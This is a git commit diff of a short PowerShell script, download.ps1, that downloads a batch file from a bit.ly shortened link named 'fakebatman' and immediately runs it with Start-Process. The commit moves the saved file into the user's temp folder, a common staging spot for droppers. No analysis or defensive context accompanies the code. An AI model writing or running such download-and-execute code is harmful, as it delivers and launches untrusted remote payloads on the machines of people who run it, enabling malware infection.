7a7b73afd9f4c6bafdf7b8d92bcae3f1940110b5
43a1723 <hai1723notgay@gmail.com>
2024-07-29 15:50:06 +0700

    Update download.ps1

--- scr/download.ps1
+++ scr/download.ps1
@@ -1,4 +1,4 @@
 $url = "https://bit.ly/fakebatman"
-$output = "downloaded_file.bat"
+$output = "$env:temp\downloaded_file.bat"
 Invoke-WebRequest -Uri $url -OutFile $output
 Start-Process -FilePath $output
